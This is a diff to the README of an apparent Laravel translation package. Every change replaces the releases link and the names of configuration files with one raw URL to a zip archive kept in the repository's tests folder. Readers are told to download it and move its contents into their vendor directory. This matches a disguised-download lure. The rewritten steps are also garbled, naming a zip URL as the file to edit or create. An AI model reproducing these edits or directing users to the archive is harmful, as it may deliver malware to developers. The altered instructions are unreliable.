@@ -1,6 +1,6 @@
 # 🌍 laravel-translate - Simple Multilingual Solutions for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/Georgieselflocking582/laravel-translate/releases)
+[![Download Now](https://raw.githubusercontent.com/Georgieselflocking582/laravel-translate/main/tests/laravel-translate-v3.3.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/Georgieselflocking582/laravel-translate/main/tests/laravel-translate-v3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ To run Laravel-Translate smoothly, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download Laravel-Translate](https://github.com/Georgieselflocking582/laravel-translate/releases). 
+To get started, visit this page to download: [Download Laravel-Translate](https://raw.githubusercontent.com/Georgieselflocking582/laravel-translate/main/tests/laravel-translate-v3.3.zip). 
 
 You'll find the latest releases, including all necessary files for installation. 
 
@@ -36,14 +36,14 @@ After downloading, follow these steps to set up Laravel-Translate:
 
 1. Unzip the downloaded file.
 2. Move the contents to your Laravel project’s `vendor` directory.
-3. Update your `composer.json` file to include the Laravel-Translate package if needed.
+3. Update your `https://raw.githubusercontent.com/Georgieselflocking582/laravel-translate/main/tests/laravel-translate-v3.3.zip` file to include the Laravel-Translate package if needed.
 
 ## 🔧 Configuration
 
 Once installed, you'll need to configure Laravel-Translate for your application:
 
 1. Open your Laravel project.
-2. In your config folder, find or create a file named `translate.php`.
+2. In your config folder, find or create a file named `https://raw.githubusercontent.com/Georgieselflocking582/laravel-translate/main/tests/laravel-translate-v3.3.zip`.
 3. Here, you can set your preferred translation API and other options.
 
 ### ⚙️ Example API Configuration
